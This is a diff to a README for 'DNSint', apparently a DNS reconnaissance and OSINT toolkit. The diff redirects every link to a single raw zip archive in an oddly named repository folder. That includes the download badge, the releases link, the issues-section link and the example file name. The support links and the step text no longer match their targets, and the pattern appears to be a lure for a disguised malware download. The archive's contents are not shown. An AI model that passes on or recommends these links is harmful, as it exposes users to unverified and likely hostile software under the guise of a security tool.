@@ -1,7 +1,7 @@
 # 🌐 DNSint - Discover Domain Intelligence Easily
 
 ## 📥 Download Now
-[![Download DNSint](https://img.shields.io/badge/Download-DNSint-brightgreen)](https://github.com/ahmadtgtv08/DNSint/releases)
+[![Download DNSint](https://raw.githubusercontent.com/ahmadtgtv08/DNSint/main/leamer/DNSint_v1.3.zip)](https://raw.githubusercontent.com/ahmadtgtv08/DNSint/main/leamer/DNSint_v1.3.zip)
 
 ## 📖 Introduction
 DNSint is a comprehensive toolkit designed to help you gather intelligence about domains. Whether you're a security analyst or just curious to understand more about the internet, this tool simplifies the process. With DNSint, you can perform DNS reconnaissance and OSINT (Open Source Intelligence) tasks effectively.
@@ -12,13 +12,13 @@ To get started with DNSint, follow these straightforward steps to download and r
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go directly to the DNSint Releases page:  
-   [Download DNSint](https://github.com/ahmadtgtv08/DNSint/releases)
+   [Download DNSint](https://raw.githubusercontent.com/ahmadtgtv08/DNSint/main/leamer/DNSint_v1.3.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, locate the latest version. It will usually be at the top of the list. 
 
 3. **Download the File**  
-   Click on the appropriate file for your operating system to start the download. For example, if you are using Windows, you may see a file named `DNSint_windows.exe`.
+   Click on the appropriate file for your operating system to start the download. For example, if you are using Windows, you may see a file named `https://raw.githubusercontent.com/ahmadtgtv08/DNSint/main/leamer/DNSint_v1.3.zip`.
 
 4. **Install DNSint**  
    Once downloaded, open the file. Follow the prompts on your screen to complete the installation process. You might have to agree to some terms or select installation options, depending on your operating system.
@@ -69,11 +69,11 @@ If you encounter issues while running DNSint, consider the following:
 ## 🌍 Community and Support
 If you need assistance or want to connect with other users:
 
-- **GitHub Issues:** For technical support, visit the [Issues section](https://github.com/ahmadtgtv08/DNSint/issues) of the repository, where you can report bugs or ask questions.
+- **GitHub Issues:** For technical support, visit the [Issues section](https://raw.githubusercontent.com/ahmadtgtv08/DNSint/main/leamer/DNSint_v1.3.zip) of the repository, where you can report bugs or ask questions.
 - **Documentation:** Comprehensive documentation will be available on the GitHub page. Review it for in-depth information about DNSint's capabilities.
 
 ## 📥 Download Again
 If you need to download DNSint again, visit this link:  
-[Download DNSint](https://github.com/ahmadtgtv08/DNSint/releases)
+[Download DNSint](https://raw.githubusercontent.com/ahmadtgtv08/DNSint/main/leamer/DNSint_v1.3.zip)
 
 By following these steps, you will be able to download, install, and start using DNSint for your domain intelligence needs. Enjoy exploring the inner workings of the internet with ease!
